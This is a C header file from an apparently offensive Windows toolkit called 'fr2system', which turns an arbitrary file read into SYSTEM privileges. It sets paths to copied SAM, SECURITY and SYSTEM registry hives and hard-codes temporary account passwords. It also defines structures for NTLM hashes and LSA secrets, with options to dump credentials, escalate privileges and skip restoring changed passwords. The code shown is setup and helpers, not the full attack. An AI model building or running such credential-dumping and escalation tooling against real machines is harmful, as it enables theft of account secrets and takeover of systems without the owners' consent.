#pragma once
// fr2system - Arbitrary File Read to SYSTEM toolkit
// Common types, defines, and helpers

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <Lmcons.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// ── Config ──
#define FR2S_INPUT_DIR       L"C:\\Windows\\Temp\\fileread"
#define FR2S_SAM_FILE        L"C:\\Windows\\Temp\\fileread\\SAM"
#define FR2S_SECURITY_FILE   L"C:\\Windows\\Temp\\fileread\\SECURITY"
#define FR2S_SYSTEM_FILE     L"C:\\Windows\\Temp\\fileread\\SYSTEM"

#define FR2S_MAX_USERS       64
#define FR2S_TEMP_PASSWORD    "$PWNed!FR2S!2026"
#define FR2S_TEMP_PASSWORD_W  L"$PWNed!FR2S!2026"
#define FR2S_TEMP_PASSWORD2   "$PWNed!FR2S!2026x2"
#define FR2S_TEMP_PASSWORD2_W L"$PWNed!FR2S!2026x2"

// ── Credential entry ──
typedef struct _FR2S_CREDENTIAL {
    wchar_t  username[UNLEN + 1];
    ULONG    rid;
    BYTE     ntlmHash[16];
    DWORD    ntlmHashLen;
    BOOL     isAdmin;
    BOOL     isCurrentUser;
} FR2S_CREDENTIAL;

// ── LSA secret entry ──
typedef struct _FR2S_LSA_SECRET {
    wchar_t  name[256];
    BYTE*    data;
    DWORD    dataLen;
} FR2S_LSA_SECRET;

// ── Options ──
typedef struct _FR2S_OPTIONS {
    BOOL verbose;
    BOOL preferSafeChain;   // try LSA secrets before SAM chain
    BOOL dumpOnly;          // just dump creds, don't escalate
    BOOL skipRestore;       // don't restore passwords (dangerous)
} FR2S_OPTIONS;

// ── Helpers ──
static void FR2S_Log(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[*] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

static void FR2S_Ok(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[+] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

static void FR2S_Err(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[-] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

static void FR2S_Warn(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[!] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

static void FR2S_HexDump(const BYTE* data, DWORD len) {
    for (DWORD i = 0; i < len; i++)
        printf("%02x", data[i]);
}

static BYTE* FR2S_ReadFileToBuffer(const wchar_t* path, DWORD* outSize) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND)
            FR2S_Err("CreateFile failed for %ws, error: %d", path, err);
        return NULL;
    }

    LARGE_INTEGER liSize;
    if (!GetFileSizeEx(hFile, &liSize) || liSize.QuadPart == 0) {
        FR2S_Err("File is empty or GetFileSizeEx failed for %ws (size: %lld, error: %d)",
            path, liSize.QuadPart, GetLastError());
        CloseHandle(hFile);
        return NULL;
    }
    DWORD sz = (DWORD)liSize.QuadPart;

    BYTE* buf = (BYTE*)malloc(sz);
    if (!buf) {
        FR2S_Err("Failed to allocate %d bytes for %ws", sz, path);
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buf, sz, &bytesRead, NULL)) {
        FR2S_Err("ReadFile failed for %ws, error: %d", path, GetLastError());
        free(buf);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);

    if (bytesRead != sz) {
        FR2S_Warn("Partial read for %ws: expected %d, got %d", path, sz, bytesRead);
    }

    if (outSize) *outSize = bytesRead;
    return buf;
}
